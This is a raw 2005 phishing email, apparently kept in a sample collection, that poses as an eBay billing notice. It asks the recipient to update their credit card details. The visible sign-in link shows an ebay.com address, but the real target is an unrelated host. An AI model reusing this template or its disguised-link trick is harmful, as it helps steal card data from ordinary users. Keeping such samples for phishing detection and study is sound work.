@@ -1,0 +1,124 @@
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+	by example.com (Postfix) with ESMTP id 591962AA20
+	for <user@example.com>; Sun, 21 Aug 2005 05:59:01 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+	id 5479B621CA0; Sun, 21 Aug 2005 05:59:01 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+	by mail.example.com (Example mail relay) with ESMTP id 35C99621C9C
+	for <user@example.com>; Sun, 21 Aug 2005 05:59:01 -0400 (EDT)
+Received: (from user@localhost)
+	by mail.example.com id FAA23006
+	for user@example.com; Sun, 21 Aug 2005 05:59:00 -0400
+Received: from severone.actionlinesrl.it (ppp-217-133-5-133.cust-adsl.tiscali.it [217.133.5.133])
+	by mail.example.com with ESMTP id FAA22998
+	for <user@example.com>; Sun, 21 Aug 2005 05:58:36 -0400
+Received: by severone.actionlinesrl.it (Postfix, from userid 1024)
+	id D59C356134; Sun, 21 Aug 2005 09:56:35 +0200 (CEST)
+From: "service@eBay.com" <service@eBay.com>
+To: user@example.com
+Subject: IMPORTANT: Verify Your eBay Account
+Content-Type: text/html
+Message-Id: <20050821075635.D59C356134@severone.actionlinesrl.it>
+Date: Sun, 21 Aug 2005 09:56:35 +0200 (CEST)
+Content-Length: 7043
+Lines: 91
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 112
+
+<!--StartFragment --> <BR>
+<TABLE cellSpacing=0 cellPadding=0 width=600 border=0>
+<TBODY>
+<TR vAlign=top>
+      <TD width=600 bgColor=#d6dcfe><FONT face="Arial, Helvetica,
+sans-serif   " size=3><STRONG><FONT face=Verdana>Update 
+        your eBay account</FONT></STRONG></FONT> </TD>
+<TD width=200 bgColor=#d6dcfe>
+<DIV align=right><IMG height=18 src="http://pics.ebaystatic.com/aw/pics/aboutme/v3/ebay_logo_39x18.gif" width=39></DIV></TD></TR>
+<TR>
+<TD bgColor=#d6dcfe colSpan=2 height=2><IMG height=2 src="http://pics.ebaystatic.com/aw/pics/x.gif" width=1></TD></TR>
+<TR>
+<TD vAlign=center bgColor=#9999cc colSpan=2 height=2><IMG height=2 src="http://pics.ebaystatic.com/aw/pics/x.gif" width=1></TD></TR></TBODY></TABLE><BR>
+<TABLE cellSpacing=0 cellPadding=0 width=600 border=0>
+<TBODY>
+<TR>
+<TD vAlign=top width=600>
+<P><FONT face="Arial, Helvetica, sans-serif   " size=-1>Dear <STRONG>eBay</STRONG>,<BR><BR>During our regularly schedule account maintenance and verification we have detected a slight error in your billing information on file with eBay. This might be due to either following reasons:<BR></FONT></P><FONT face="Arial, Helvetica, sans-serif   " size=-1> </FONT>
+<P><FONT face="Arial, Helvetica, sans-serif   " size=-1><FONT face=arial>             - A recent change in your personal information (i.e. change of address)<BR>             - Submitting invalid information during the initial sign up process.<BR>             - An inability to accurately verify your selected option of payment due an internal error within<BR>               our processors.<BR></FONT><FONT face=arial><BR></FONT></FONT></P>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD bgColor=#cccccc colSpan=3 height=2><IMG title="" height=2 alt=" " src="http://pics.ebaystatic.com/aw/pics/x.gif" width=1></TD></TR>
+<TR bgColor=#f4f4f4>
+<TD width=2 bgColor=#cccccc rowSpan=2><IMG title="" height=1 alt=" " src="http://pics.ebaystatic.com/aw/pics/x.gif" width=2></TD>
+<TD>
+<TABLE cellSpacing=0 cellPadding=3 width="100%" border=0>
+<TBODY>
+<TR>
+<TD noWrap width="20%"><FONT face="Arial Black" size=2>Your credit card on file with eBay</FONT></TD>
+<TD width="60%"> </TD>
+<TD noWrap align=right width="20%"> </TD></TR></TBODY></TABLE></TD>
+<TD width=2 bgColor=#cccccc rowSpan=2><IMG title="" height=1 alt=" " src="http://pics.ebaystatic.com/aw/pics/x.gif" width=2></TD></TR>
+<TR>
+<TD>
+<TABLE cellSpacing=0 cellPadding=3 width="100%" border=0>
+<TBODY>
+<TR>
+<TD noWrap width="20%"><FONT face=arial size=2>Card number: XXXX-XXXX-XXXX-XXXX (Not shown for security purposes)</FONT> </TD>
+<TD width="60%"></TD>
+<TD noWrap align=right width="20%"><FONT face="Arial , Helvetica,
+sans-serif   " size=2>Expiration date: XX/XX</FONT> </TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD bgColor=#cccccc colSpan=3 height=2><IMG title="" height=2 alt=" " src="http://pics.ebaystatic.com/aw/pics/x.gif" width=1></TD></TR></TBODY></TABLE>
+<P><FONT size=2><FONT face=Arial>Please sign in to your eBay account and update your billing information:</FONT><IMG height=20 src="http://pics.ebaystatic.com/aw/pics/x.gif" width=1 border=0><BR></FONT><IMG height=20 src="http://pics.ebaystatic.com/aw/pics/x.gif" width=1 border=0><BR><FONT size=3><FONT face="Arial black, Helvetica, sans-serif   "><A title="http://signin.ebay.com/eBayISAPI.dll?SignIn&ssPageName=h:h:sin:US" href="http://cpanel21.fuitadnet.com/~linda/extras/win32/cgi-bin/www.eBay.com/Update-User/CreditCardInformation/"><FONT color=#003399>http://signin.ebay.com/eBayISAPI.dll?SignIn&ssPageName=h:h:sin:US <FONT face=arial size=2></FONT></FONT></A><FONT color=#003399></FONT></FONT></FONT></P>
+<P><FONT size=2><FONT size=2><FONT face="Arial, Helvetica, sans-serif   "><FONT color=#003399><IMG height=10 src="http://pics.ebaystatic.com/aw/pics/x.gif" width=1 border=0></FONT>If your account information is not update, your ability to sell or bid on eBay will become restricted.<BR></FONT></FONT><FONT size=2><FONT face="Arial, Helvetica,
+sans-serif   "></FONT></FONT></FONT></P>
+<P><FONT size=2><FONT face=Arial><FONT size=2>Thank you, Mark Ryden<BR>
+        eBay Billing Department</FONT><BR>
+        </FONT><IMG height=10 src="http://pics.ebaystatic.com/aw/pics/x.gif" width=1 border=0><BR>
+        <TABLE cellSpacing=0 cellPadding=0 width=>
+          <TBODY>
+            <TR> 
+              <TD> <HR color=#d2d3d2 noShade> </TD>
+            </TR>
+            <TR> 
+              <TD><FONT face=Arial color=#666666 size=1>eBay treats your personal 
+                information with the utmost care, and our Privacy Policy is designed 
+                to protect you and your information. eBay will never ask their 
+                users for personal information, such as bank account numbers, 
+                credit card numbers, pin numbers, passwords, or Social Security 
+                numbers in an email. For more information on how to protect your 
+                eBay password and your account, please visit <A title=http://pages.ebay.com/help/account_protection.html href="http://pages.ebay.com/help/account_protection.html" onfiltered="return openNonHelpWindow(this.href);"><FONT color=#003399>User 
+                Account Protection</FONT></A>.</FONT></TD>
+            </TR>
+            <TR> 
+              <TD><IMG height=15 alt=" " src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width=1></TD>
+            </TR>
+            <TR> 
+              <TD><FONT face=Arial color=#666666 size=1>This eBay notice was sent 
+                to you based on your eBay account preferences and in accordance 
+                with our <A title=http://pages.ebay.com/help/community/png-priv.html href="http://pages.ebay.com/help/community/png-priv.html" onfiltered="return openNonHelpWindow(this.href);"><FONT color=#003399>Privacy 
+                Policy</FONT></A>. To change your notification preferences, <A title=http://cgi4.ebay.com/ws1/eBayISAPI.dll?OptinLoginShow href="http://cgi4.ebay.com/ws1/eBayISAPI.dll?OptinLoginShow" onfiltered="return openNonHelpWindow(this.href);"><FONT color=#003399>click 
+                here</FONT></A>. If you would like to receive this email in text 
+                format, <A title=http://cgi4.ebay.com/ws1/eBayISAPI.dll?OptinLoginShow href="http://cgi4.ebay.com/ws1/eBayISAPI.dll?OptinLoginShow" onfiltered="return openNonHelpWindow(this.href);"><FONT color=#003399>click 
+                here</FONT></A>.</FONT></TD>
+            </TR>
+            <TR> 
+              <TD><IMG height=15 alt=" " src="http://pics.ebaystatic.com/aw/pics/spacer.gif" width=1></TD>
+            </TR>
+            <TR> 
+              <TD> <P align=center><FONT face=Arial color=#666666 size=2>Copyright 
+                  © 2005 eBay Inc. All Rights Reserved. <BR>
+                  Designated trademarks and brands are the property of their respective 
+                  owners.<BR>
+                  eBay and the eBay logo are trademarks of eBay Inc.</FONT></P></TD>
+            </TR>
+          </TBODY>
+        </TABLE>
+        </FONT></P></TD>
+    </TR></TBODY></TABLE>
+
